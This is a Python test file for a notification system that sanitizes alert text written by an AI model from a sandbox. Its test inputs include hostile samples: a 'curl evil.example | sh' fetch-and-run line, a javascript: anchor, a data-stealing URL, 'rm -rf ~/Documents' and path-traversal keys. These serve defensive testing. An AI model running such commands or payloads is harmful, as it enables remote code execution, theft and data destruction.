"""The fire-and-forget notification class, and the three constraints on it.

`task_alert` is the one source with no object to watch. Nothing outside the table
will ever close one of its rows, which makes it both the source the whole
`auto_resolve_on_seen` mechanism was built for and the one that can quietly go
wrong in ways the object-backed sources cannot:

- **It carries model-authored text.** `_process_deferred_user_alerts` reads a
  JSON file the model wrote from *inside the sandbox*, and `send_notification`
  puts that text into Talk, which renders markdown. So every stored title and
  body is flattened, and the resolver emits no `link` and no `LINK` action on any
  path — a link there is a model-authored URL rendered into an anchor, where a
  text-node rule buys nothing.
- **Its producers have no bound of their own.** A model-authored array has no
  bound on entry count and an alert type is a string the model chose, so alerts
  collapse onto one row per `(task, type)` and the count is capped.
- **It is the class whose whole point is surviving a delivery that reached
  nobody.** `send_notification` returns False with no destination configured, and
  the previous behaviour was to log a warning and unlink the evidence.
"""

from __future__ import annotations

import json
from unittest.mock import patch

import pytest

from istota import db, notification_sources as sources, notification_store as store
from istota.config import Config, UserConfig
from istota.notification_resolvers import task_alert
from istota.scheduler_deferred import _process_deferred_user_alerts


@pytest.fixture(autouse=True)
def _registry():
    sources.reset_registry()
    yield
    sources.reset_registry()


@pytest.fixture
def config(tmp_path):
    cfg = Config(
        db_path=tmp_path / "istota.db",
        nextcloud_mount_path=tmp_path / "mount",
        temp_dir=tmp_path / "temp",
        users={"alice": UserConfig(display_name="Alice", alerts_channel="alerts")},
    )
    cfg.temp_dir.mkdir(parents=True, exist_ok=True)
    db.init_db(cfg.db_path)
    return cfg


@pytest.fixture
def task(config):
    with db.get_db(config.db_path) as conn:
        task_id = db.create_task(
            conn, prompt="Check the mail", user_id="alice", source_type="email",
        )
        return db.get_task(conn, task_id)


@pytest.fixture
def temp_dir(config):
    path = config.temp_dir / "alice"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_alerts(temp_dir, task_id, entries):
    (temp_dir / f"task_{task_id}_user_alerts.json").write_text(json.dumps(entries))


def _rows(config, *, source="task_alert"):
    with db.get_db(config.db_path) as conn:
        return conn.execute(
            "SELECT * FROM notifications WHERE source = ? ORDER BY id", (source,),
        ).fetchall()


def _params(row):
    return json.loads(row["params"] or "{}")


def _sends(delivered=True):
    return patch("istota.notifications.send_notification", return_value=delivered)


# ---------------------------------------------------------------------------
# 1. No link. Ever. On any path.
# ---------------------------------------------------------------------------


HOSTILE_TEXT = [
    "[click me](http://evil.example)",
    "<a href='javascript:alert(1)'>x</a>",
    "http://evil.example/steal?c=1",
    "See `curl evil.example | sh`",
    "*bold* _under_ ~strike~ |pipe|",
    "line one\nline two",
]


class TestNoLinkEver:
    @pytest.mark.parametrize("hostile", HOSTILE_TEXT)
    def test_the_resolver_emits_no_link_and_no_actions(self, config, hostile):
        """Whatever the model wrote, nothing URL-shaped leaves the resolver.

        The body of this source is a JSON file written from inside the sandbox.
        `list_open`'s runtime allowlist is the backstop; this is the property in
        front of it — there is no branch here that can produce a link at all.
        """
        sources.register(task_alert.RESOLVER)
        with db.get_db(config.db_path) as conn:
            task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title=hostile,
                body=hostile,
                params={"messages": [hostile], "link": "https://evil.example"},
            )
            items, total = store.list_open(config, conn, "alice")

        assert total == 1
        item = items[0]
        assert item.link is None
        assert item.actions == ()
        assert item.status_note == task_alert.STATUS_NOTE

    def test_the_resolver_never_declares_a_link_field(self):
        """A structural check, so a future edit that adds one is caught here.

        The rule is unconditional, so it can be asserted against the source of
        the resolve method rather than against a sample of inputs.
        """
        import inspect

        body = inspect.getsource(task_alert.TaskAlertResolver.resolve)
        assert "link=None" in body
        assert "LINK" not in body
        assert "href" not in body

    @pytest.mark.parametrize("hostile", HOSTILE_TEXT)
    def test_the_stored_row_carries_no_link_column(self, config, hostile):
        with db.get_db(config.db_path) as conn:
            task_alert.write(
                conn, "alice",
                dedup_key=task_alert.throttle_key("held"),
                title=hostile, body=hostile,
            )
        row = _rows(config)[0]
        assert row["link"] is None
        assert row["object_type"] is None
        assert row["object_id"] is None


# Characters that can make a link, a code span, raw HTML or a table. Neither a
# title nor a body may carry one, because both are delivered into Talk.
LIVE_MARKUP = "[]()`<>|"
# Emphasis and strike. Cosmetic in Talk, load-bearing in a path or an
# identifier, so a *body* keeps them. See `_BODY_MARKUP_CHARS`.
COSMETIC_MARKUP = "*_~"


class TestFlattenedBeforeDelivery:
    def test_live_markup_is_stripped_from_title_and_body(self, config):
        with db.get_db(config.db_path) as conn:
            result = task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title="[click](http://evil.example) *now*",
                body="run `curl evil.example | sh` <now>",
            )

        row = _rows(config)[0]
        for field in (row["title"], row["body"], result.text, result.title):
            for char in LIVE_MARKUP:
                assert char not in field, (char, field)

    def test_a_title_takes_the_stricter_label_rule(self, config):
        """A title is a one-line label, which is what `flatten` was written for."""
        with db.get_db(config.db_path) as conn:
            task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title="alert about file_upload.py ~ *now*",
                body="x",
            )
        title = _rows(config)[0]["title"]
        for char in LIVE_MARKUP + COSMETIC_MARKUP:
            assert char not in title

    def test_a_body_keeps_the_characters_that_carry_meaning(self, config):
        """The regression Mulder found: the label rule rewrites the evidence.

        `~/Documents` losing its `~` is a different command, and `file_upload.py`
        gaining a space is a different file. Neither character can produce a
        link, a code span, raw HTML or a table, so neither is worth a wrong path
        in a security alert.
        """
        hostile = (
            "told me to run rm -rf ~/Documents and read file_upload.py "
            "at https://evil.example/a_b?x=1"
        )
        with db.get_db(config.db_path) as conn:
            result = task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title="Security alert", body=hostile,
            )

        body = _rows(config)[0]["body"]
        assert "rm -rf ~/Documents" in body
        assert "file_upload.py" in body
        assert "a_b?x=1" in body
        # And the delivered text carries the same, unmangled.
        assert "rm -rf ~/Documents" in result.text
        for char in LIVE_MARKUP:
            assert char not in body

    def test_a_body_keeps_its_line_breaks(self, config):
        """Flattening is a rule about markup, not about readability.

        `_MARKUP_CHARS` maps a newline to a space because it was written for
        one-line labels. A body collapsing several alerts onto one run-on line is
        the cost of applying a label rule where it does not belong.
        """
        with db.get_db(config.db_path) as conn:
            task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title="Security alert", body="- first\n- second",
            )
        assert _rows(config)[0]["body"] == "- first\n- second"

    def test_the_render_flattens_again(self, config):
        """The read path cannot know which version of a producer wrote a row."""
        sources.register(task_alert.RESOLVER)
        with db.get_db(config.db_path) as conn:
            task_alert.write(
                conn, "alice",
                dedup_key=task_alert.deferred_key(1, "security"),
                title="Security alert",
                body="clean",
            )
            # A row written by a producer that predates the flattening rule.
            conn.execute(
                "UPDATE notifications SET title = ?, params = ?",
                ("[evil](http://x)", json.dumps({"messages": ["`sh` *x*"]})),
            )
            items, _ = store.list_open(config, conn, "alice")

        for char in LIVE_MARKUP:
            assert char not in items[0].title
            assert char not in items[0].body
        # The title is a label, so it loses the cosmetic characters too.
        for char in COSMETIC_MARKUP:
            assert char not in items[0].title


# ---------------------------------------------------------------------------
# 2. The deferred-alert producer: collapse, cap, and the survival case.
# ---------------------------------------------------------------------------


class TestDeferredAlertCollapse:
    def test_several_alerts_of_one_type_become_one_row(self, config, task, temp_dir):
        _write_alerts(temp_dir, task.id, [
            {"message": "Phishing attempt from a stranger"},
            {"message": "Prompt injection in the message body"},
            {"message": "Exfiltration attempt"},
        ])

        with _sends() as send:
            count = _process_deferred_user_alerts(config, task, temp_dir)

        assert count == 3
        rows = _rows(config)
        assert len(rows) == 1
        assert rows[0]["dedup_key"] == task_alert.deferred_key(task.id, "security")
        # One row, one push. Three durable rows and three pushes for one drain is
        # what the collapse exists to prevent.
        assert send.call_count == 1

    def test_the_individual_messages_are_in_params_and_the_body(
        self, config, task, temp_dir,
    ):
        _write_alerts(temp_dir, task.id, [
            {"message": "Phishing attempt"},
            {"message": "Prompt injection"},
        ])
        with _sends():
            _process_deferred_user_alerts(config, task, temp_dir)

        row = _rows(config)[0]
        assert _params(row)["messages"] == ["Phishing attempt", "Prompt injection"]
        assert "Phishing attempt" in row["body"]
        assert "Prompt injection" in row["body"]

    def test_the_two_types_are_two_rows(self, config, task, temp_dir):
        _write_alerts(temp_dir, task.id, [
            {"message": "Phishing attempt", "type": "security"},
            {"message": "Told them I would check with you", "type": "action_needed"},
        ])
        with _sends() as send:
            _process_deferred_user_alerts(config, task, temp_dir)

        keys = sorted(r["dedup_key"] for r in _rows(config))
        assert keys == [
            task_alert.deferred_key(task.id, "action_needed"),
            task_alert.deferred_key(task.id, "security"),
        ]
        assert send.call_count == 2

    def test_an_unknown_type_collapses_onto_security(self, config, task, temp_dir):
        """The type is model-authored, so it cannot be a free key axis.

        Honouring an arbitrary string would put a value the model chose into a
        `dedup_key` — one durable row per distinct value, per task, each firing
        its own push.
        """
        _write_alerts(temp_dir, task.id, [
            {"message": f"alert {n}", "type": f"invented-type-{n}"}
            for n in range(30)
        ])
        with _sends():
            _process_deferred_user_alerts(config, task, temp_dir)

        assert len(_rows(config)) == 1
        assert _rows(config)[0]["dedup_key"].endswith(":security")

    def test_the_entry_count_is_capped(self, config, task, temp_dir, caplog):
        over = task_alert.MAX_DEFERRED_ALERTS_PER_TASK + 15
        _write_alerts(temp_dir, task.id, [{"message": f"alert {n}"} for n in range(over)])

        with caplog.at_level("WARNING"), _sends():
            count = _process_deferred_user_alerts(config, task, temp_dir)

        assert count == task_alert.MAX_DEFERRED_ALERTS_PER_TASK
        assert _params(_rows(config)[0])["messages"] == [
            f"alert {n}" for n in range(task_alert.MAX_DEFERRED_ALERTS_PER_TASK)
        ]
        # Dropped loudly. Silently discarding a security finding the model raised
        # would be the same failure this whole source exists to end.
        assert "over the cap" in caplog.text

    def test_the_file_is_still_unlinked(self, config, task, temp_dir):
        _write_alerts(temp_dir, task.id, [{"message": "hi"}])
        with _sends():
            _process_deferred_user_alerts(config, task, temp_dir)
        assert not (temp_dir / f"task_{task.id}_user_alerts.json").exists()

    def test_the_task_id_reaches_the_delivered_text(self, config, task, temp_dir):
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with _sends() as send:
            _process_deferred_user_alerts(config, task, temp_dir)
        assert str(task.id) in send.call_args.args[2]
        assert "Security alert" in send.call_args.args[2]


class TestTheRowSurvivesADeliveryThatReachedNobody:
    def test_no_destination_leaves_an_open_undelivered_row(
        self, config, task, temp_dir,
    ):
        """The case the inbox exists for.

        `send_notification` returns False when the user has no destination
        configured. The old path logged nothing, counted nothing and then
        unlinked the file — the model raised an alert, the push went nowhere, and
        the evidence was deleted.
        """
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])

        with _sends(delivered=False) as send:
            count = _process_deferred_user_alerts(config, task, temp_dir)

        assert send.call_count == 1
        assert send.return_value is False
        assert count == 1

        rows = _rows(config)
        assert len(rows) == 1
        assert rows[0]["state"] == "open"
        assert rows[0]["last_delivered_at"] is None
        assert "Phishing attempt" in rows[0]["body"]

    def test_a_successful_delivery_stamps_the_row(self, config, task, temp_dir):
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with _sends(delivered=True):
            _process_deferred_user_alerts(config, task, temp_dir)
        assert _rows(config)[0]["last_delivered_at"] is not None

    def test_a_failed_raise_never_fails_the_drain(
        self, config, task, temp_dir, caplog,
    ):
        """`_drain_deferred_ops` calls nine handlers with nothing between them.

        `write_notification` never raises, but `db.get_db` can, and an exception
        escaping this handler skips `_deliver_deferred_email_output` and the
        unconsumed-file warning behind it — a lost email reply as the price of a
        failed notification write.
        """
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with (
            caplog.at_level("WARNING"),
            patch("istota.scheduler_deferred.db.get_db",
                  side_effect=RuntimeError("locked")),
            _sends(),
        ):
            count = _process_deferred_user_alerts(config, task, temp_dir)

        assert count == 1
        assert "Could not record the deferred user alerts" in caplog.text

    def test_an_unwritable_db_still_pushes_the_alert(
        self, config, task, temp_dir,
    ):
        """Routing through the DB must not become a new way to lose the alert.

        Before the inbox this path called `send_notification` directly and
        touched no database. Making the send conditional on a successful write
        would mean a locked or unwritable framework DB produced no row, no push
        and a deleted file — strictly worse than the behaviour this whole change
        set out to fix.
        """
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with (
            patch("istota.scheduler_deferred.db.get_db",
                  side_effect=RuntimeError("locked")),
            _sends(delivered=True) as send,
        ):
            _process_deferred_user_alerts(config, task, temp_dir)

        assert send.call_count == 1
        assert "Phishing attempt" in send.call_args.args[2]
        assert send.call_args.kwargs["purpose"] == "alert"
        # The alert reached somebody, so the file has done its job.
        assert not (temp_dir / f"task_{task.id}_user_alerts.json").exists()

    def test_no_row_and_no_destination_keeps_the_evidence_file(
        self, config, task, temp_dir, caplog,
    ):
        """Nothing holds the alert now, so the file is what is left of it.

        This is the exact failure the spec names: "the model raised an alert,
        the push went nowhere, the evidence was deleted."
        """
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with (
            caplog.at_level("ERROR"),
            patch("istota.scheduler_deferred.db.get_db",
                  side_effect=RuntimeError("locked")),
            _sends(delivered=False),
        ):
            _process_deferred_user_alerts(config, task, temp_dir)

        assert (temp_dir / f"task_{task.id}_user_alerts.json").exists()
        assert "neither recorded nor delivered" in caplog.text

    def test_a_written_row_is_enough_to_release_the_file(
        self, config, task, temp_dir,
    ):
        """A row with no delivery is the ordinary success case, not a failure."""
        _write_alerts(temp_dir, task.id, [{"message": "Phishing attempt"}])
        with _sends(delivered=False):
            _process_deferred_user_alerts(config, task, temp_dir)

        assert not (temp_dir / f"task_{task.id}_user_alerts.json").exists()
        assert _rows(config)[0]["state"] == "open"


# ---------------------------------------------------------------------------
# 3. Auto-resolve, which is what this source registered for.
# ---------------------------------------------------------------------------


class TestAutoResolveOnSeen:
    def test_the_source_declares_it(self):
        assert task_alert.RESOLVER.auto_resolve_on_seen is True
        assert "task_alert" in sources.auto_resolve_sources()

    def test_being_seen_closes_the_row(self, config):
        with db.get_db(config.db_path) as conn:
            result = task_alert.write(
                conn, "alice",
                dedup_key=task_alert.expired_key(7),
                title="A request timed out",
            )
            row = conn.execute(
                "SELECT updated_at FROM notifications WHERE id = ?",
                (result.notification_id,),
            ).fetchone()
            store.mark_seen(conn, "alice", [(result.notification_id, row["updated_at"])])

        closed = _rows(config)[0]
        assert closed["state"] == "resolved"
        assert closed["resolved_by"] == "web"

    def test_the_resolver_never_returns_none(self, config):
        """`None` means "the object is gone", and this source has no object.

        Returning it on any path would mark the row `stale` and drop it from the
        panel without the user ever having read it — permanently, since nothing
        raises a fire-and-forget notice twice.
        """
        sources.register(task_alert.RESOLVER)
        with db.get_db(config.db_path) as conn:
            for key in ("task:0:security", "throttle:held", "dmarc:fail",
                        "expired:99999", "undelivered:99999"):
                task_alert.write(conn, "alice", dedup_key=key, title="Notice")
            items, total = store.list_open(config, conn, "alice")

        assert total == 5
        assert len(items) == 5
        assert all(
            r["state"] == "open" for r in _rows(config)
        )

    def test_the_sweep_closes_an_aged_row(self, config):
        sources.register(task_alert.RESOLVER)
        with db.get_db(config.db_path) as conn:
            result = task_alert.write(
                conn, "alice", dedup_key="dmarc:fail", title="Notice",
            )
            stamp = db.iso_utc_days_ago(store.NOTIFICATION_ALERT_MAX_AGE_DAYS + 1)
            conn.execute(
                "UPDATE notifications SET updated_at = ? WHERE id = ?",
                (stamp, result.notification_id),
            )
            assert store.sweep_expired_alerts(conn) == 1

        assert _rows(config)[0]["resolved_by"] == "system"


# ---------------------------------------------------------------------------
# 4. Keys, and the axes they are built from.
# ---------------------------------------------------------------------------


class TestKeysAreBounded:
    @pytest.mark.parametrize("hostile", [
        "1/../../admin", "a:b:c", "x" * 500, "", None, "\n", "  ", "É" * 40,
    ])
    def test_no_key_component_escapes_its_shape(self, hostile):
        keys = [
            task_alert.deferred_key(hostile, hostile),
            task_alert.throttle_key(hostile),
            task_alert.expired_key(hostile),
            task_alert.dmarc_key(hostile),
            task_alert.undelivered_key(hostile),
        ]
        for key in keys:
            prefix, _, rest = key.partition(":")
            assert prefix in (
                "task", "throttle", "expired", "dmarc", "undelivered",
            )
            assert len(key) < 100
            assert "\n" not in key and "/" not in key
            # `task:` legitimately carries a second colon (the alert type); no
            # other key may, and no *component* may contain one.
            assert rest.count(":") == (1 if prefix == "task" else 0)

    def test_the_deferred_key_names_the_task_and_the_type(self):
        assert task_alert.deferred_key(12, "action_needed") == "task:12:action_needed"
        assert task_alert.deferred_key(12, "security") == "task:12:security"


# ---------------------------------------------------------------------------
# 5. The held-mail throttle notices — same class, different gate.
# ---------------------------------------------------------------------------


class TestThrottleNotices:
    """`_deliver_throttle_notices` keeps its per-window in-process gate.

    The spec rejected replacing that window with table dedup, and the reason is
    the same one `last_delivered_at` records only successful sends: the throttle
    stamp is written only on a delivery that reached somebody, so an open-row
    suppression would let one failed send silence every subsequent notice.
    """

    @pytest.fixture(autouse=True)
    def _clear_window(self):
        from istota.transport.email import inbound as inbound_module

        inbound_module._reset_volume_state()
        yield
        inbound_module._reset_volume_state()

    def _deliver(self, config, notices, window=3600, delivered=True):
        from istota.transport.email import inbound as inbound_module

        with patch("istota.notifications.send_notification",
                   return_value=delivered) as send:
            inbound_module._deliver_throttle_notices(config, notices, window)
        return send

    def _notice(self, *, filed=0, held=0, user_id="alice"):
        from istota.transport.email import inbound as inbound_module

        notice = inbound_module._ThrottleNotice(user_id=user_id)
        for n in range(filed):
            notice.record(f"loud{n}@example.com")
        for n in range(held):
            notice.record_held(f"stranger{n}@example.com")
        return {user_id: notice}

    def _throttle_rows(self, config):
        with db.get_db(config.db_path) as conn:
            return conn.execute(
                "SELECT * FROM notifications WHERE dedup_key LIKE 'throttle:%' "
                "ORDER BY dedup_key",
            ).fetchall()

    def test_each_kind_is_its_own_row(self, config):
        self._deliver(config, self._notice(filed=3, held=2))

        rows = self._throttle_rows(config)
        assert [r["dedup_key"] for r in rows] == ["throttle:held", "throttle:throttled"]
        by_key = {r["dedup_key"]: r for r in rows}
        # Held mail is on a two-hour clock and asks the user to answer `!confirm`;
        # throttled mail is filed, recoverable and asks nothing. `actionable` is
        # per row precisely so the two can differ.
        assert by_key["throttle:held"]["actionable"] == 1
        assert by_key["throttle:throttled"]["actionable"] == 0
        assert all(r["link"] is None for r in rows)

    def test_a_window_suppressed_poll_neither_sends_nor_bumps(self, config):
        """The window sits upstream of the row, so the two agree on the count.

        A poll runs about once a minute against an hour-long window. Writing the
        row first and checking the window after would bump it roughly sixty
        times per notice, and `occurrences` would count polls rather than
        notices raised.
        """
        from istota.transport.email import inbound as inbound_module

        with patch("istota.notifications.send_notification", return_value=True) as send:
            inbound_module._deliver_throttle_notices(config, self._notice(filed=3), 3600)
            inbound_module._deliver_throttle_notices(config, self._notice(filed=4), 3600)

        assert send.call_count == 1
        rows = self._throttle_rows(config)
        assert len(rows) == 1
        assert rows[0]["occurrences"] == 1
        assert _params(rows[0])["filed"] == 3

    def test_a_read_entry_is_not_reopened_by_the_next_poll(self, config):
        """The defect this ordering exists to prevent: an un-clearable entry.

        With the row written before the window check, a sustained flood put the
        entry back within a poll interval of the user reading it, every time,
        with no push to explain the return — and the churn on `updated_at` also
        cost `mark_seen` its version check and stopped the age sweep ever
        reaching the row.
        """
        from istota.transport.email import inbound as inbound_module

        with patch("istota.notifications.send_notification", return_value=True):
            inbound_module._deliver_throttle_notices(config, self._notice(filed=3), 3600)

        row = self._throttle_rows(config)[0]
        with db.get_db(config.db_path) as conn:
            store.mark_seen(conn, "alice", [(row["id"], row["updated_at"])])
        assert self._throttle_rows(config)[0]["state"] == "resolved"

        # The flood is still going; the next poll finds more over-budget mail.
        with patch("istota.notifications.send_notification", return_value=True) as send:
            inbound_module._deliver_throttle_notices(config, self._notice(filed=9), 3600)

        assert send.call_count == 0
        after = self._throttle_rows(config)[0]
        assert after["state"] == "resolved"
        assert after["updated_at"] == self._throttle_rows(config)[0]["updated_at"]

    def test_the_window_lapsing_does_reopen_the_entry(self, config):
        """Dismissing means "not now", not "never again"."""
        from istota.transport.email import inbound as inbound_module

        with patch("istota.notifications.send_notification", return_value=True):
            inbound_module._deliver_throttle_notices(config, self._notice(filed=3), 3600)

        row = self._throttle_rows(config)[0]
        with db.get_db(config.db_path) as conn:
            store.mark_seen(conn, "alice", [(row["id"], row["updated_at"])])

        # Same poll shape, but the window has lapsed.
        inbound_module._reset_volume_state()
        with patch("istota.notifications.send_notification", return_value=True) as send:
            inbound_module._deliver_throttle_notices(config, self._notice(filed=9), 3600)

        assert send.call_count == 1
        after = self._throttle_rows(config)[0]
        assert after["state"] == "open"
        assert after["occurrences"] == 2
        assert _params(after)["filed"] == 9

    def test_a_failed_send_leaves_the_row_and_does_not_open_the_window(self, config):
        from istota.transport.email import inbound as inbound_module

        self._deliver(config, self._notice(filed=3), delivered=False)

        row = self._throttle_rows(config)[0]
        assert row["state"] == "open"
        assert row["last_delivered_at"] is None
        # One failed send must not swallow the next window's notice.
        assert inbound_module._throttle_alerted == {}

    def test_a_successful_send_stamps_the_row(self, config):
        self._deliver(config, self._notice(held=2))
        assert self._throttle_rows(config)[0]["last_delivered_at"] is not None

    def test_the_senders_are_recorded_and_bounded(self, config):
        self._deliver(
            config, self._notice(filed=task_alert.MAX_PARAM_ENTRIES + 10),
        )
        params = _params(self._throttle_rows(config)[0])
        assert len(params["senders"]) == task_alert.MAX_PARAM_ENTRIES

    def test_the_recorded_senders_are_the_loudest_not_the_alphabetical_first(
        self, config,
    ):
        """The row must name the senders the notice beside it names.

        `_ThrottleNotice.message` lists the top few *by message count*, and
        `record_held` gives the reason. A row sorting the addresses instead
        would name a different, arbitrary set from the push it accompanies —
        and on an alphabetical cut the loudest sender can be absent entirely.
        """
        from istota.transport.email import inbound as inbound_module

        notice = inbound_module._ThrottleNotice(user_id="alice")
        # `zzz` is last alphabetically and by far the loudest.
        for _ in range(50):
            notice.record("zzz-loudest@example.com")
        for n in range(task_alert.MAX_PARAM_ENTRIES + 5):
            notice.record(f"aaa-quiet{n:02d}@example.com")

        self._deliver(config, {"alice": notice})
        senders = _params(self._throttle_rows(config)[0])["senders"]

        assert senders[0] == "zzz-loudest@example.com"
        assert len(senders) == task_alert.MAX_PARAM_ENTRIES
